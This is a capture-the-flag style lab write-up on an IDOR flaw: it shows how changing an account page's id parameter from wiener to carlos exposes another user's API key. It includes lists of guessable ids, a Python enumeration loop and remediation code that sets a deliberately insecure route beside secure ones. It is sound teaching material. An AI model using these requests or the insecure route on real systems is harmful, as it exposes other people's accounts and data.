# User ID Controlled by Request Parameter

**Difficulty:** `APPRENTICE` | **Category:** `Access Control`

---

## 🎯 Lab Goal

Find the GUID for carlos and submit his API key as the solution.

---

## 📋 Lab Description

The lab has a horizontal privilege escalation vulnerability on the user account page. Despite mentioning GUIDs, the system still accepts predictable user identifiers.

---

## 🔎 Reconnaissance

### Initial Access

Logged in with provided credentials:

| Field | Value |
|-------|-------|
| Username | `wiener` |
| Password | `peter` |

### Account Page Analysis

Captured the login request in Burp Suite and observed:

```http
GET /my-account?id=wiener HTTP/1.1
```

🔍 **Interesting finding:** Despite the lab description mentioning GUIDs, the actual implementation uses simple username-based identifiers.

---

## 🧪 Testing & Exploitation

### Step 1: Identify IDOR Vulnerability

Original request structure:
```http
GET /my-account?id=wiener
```

The `id` parameter directly references the username without authorization checks.

### Step 2: Parameter Manipulation

Modified the request to access Carlos's account:

**Original:**
```http
GET /my-account?id=wiener
```

**Modified:**
```http
GET /my-account?id=carlos
```

### Step 3: Retrieve API Key

Replayed the modified request.

**Result:** Successfully accessed Carlos's account and extracted his API key! ✅

---

## 🚩 Solution

**Exploit Request:**
```http
GET /my-account?id=carlos
```

---

## 💡 Key Takeaways

### Security Through Obscurity Fails

- **Claiming to use GUIDs** doesn't mean they're actually implemented
- Always test the actual implementation, not just the documentation
- Developers sometimes plan security features but fail to implement them

### IDOR Variants

| Implementation | Security Level | Notes |
|---------------|---------------|-------|
| `?id=username` | ❌ Very Low | Easily guessable |
| `?id=123` | ❌ Low | Sequential enumeration |
| `?id=guid` | ⚠️ Medium | Harder but often leaked |
| `?id=signed_token` | ✅ High | Cryptographically secure |

### Common Testing Patterns

```bash
# Try simple usernames
?id=admin
?id=administrator
?id=carlos
?id=root

# Try common variations
?id=user1
?id=testuser
?id=guest

# Try different parameter names
?userid=carlos
?user=carlos
?username=carlos
```

---

## 🛡️ Remediation

### Secure Implementation

**❌ Bad (No Authorization):**
```python
@app.route('/my-account')
def my_account():
    user_id = request.args.get('id')
    user = User.query.filter_by(username=user_id).first()
    return jsonify({
        'username': user.username,
        'api_key': user.api_key
    })
```

**✅ Good (Session-Based):**
```python
@app.route('/my-account')
@login_required
def my_account():
    # Don't accept user input - use session
    user = User.query.get(session['user_id'])
    return jsonify({
        'username': user.username,
        'api_key': user.api_key
    })
```

**✅ Better (With Explicit Authorization):**
```python
@app.route('/my-account')
@login_required
def my_account():
    requested_id = request.args.get('id')
    current_user = session['username']
    
    # Verify user can only access their own data
    if requested_id != current_user:
        abort(403, "Unauthorized access")
    
    user = User.query.filter_by(username=current_user).first()
    return jsonify({
        'username': user.username,
        'api_key': user.api_key
    })
```

### Best Practices

- ✅ **Use session data** instead of user-supplied IDs
- ✅ **Validate ownership** before returning sensitive data
- ✅ **Implement proper authorization checks**
- ✅ **Use indirect references** when possible
- ✅ **Log unauthorized access attempts**
- ✅ **Rate limit** sensitive endpoints
- ✅ **Test actual implementation**, not assumptions

### Authorization Middleware Example

```python
def require_ownership(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        requested_id = request.args.get('id')
        current_user = session.get('username')
        
        if requested_id != current_user:
            abort(403)
        
        return f(*args, **kwargs)
    return decorated_function

@app.route('/my-account')
@login_required
@require_ownership
def my_account():
    user = User.query.filter_by(username=session['username']).first()
    return jsonify(user.to_dict())
```

### Testing for IDOR

```python
# Automated IDOR testing script
import requests

session = requests.Session()
# Login as user1
session.post('/login', data={'username': 'user1', 'password': 'pass'})

# Try accessing other users
test_users = ['admin', 'carlos', 'user2', 'administrator']

for user in test_users:
    response = session.get(f'/my-account?id={user}')
    if response.status_code == 200:
        print(f"[VULN] Can access {user}'s account!")
        print(response.text)
```

---

**Status:** ✅ Solved
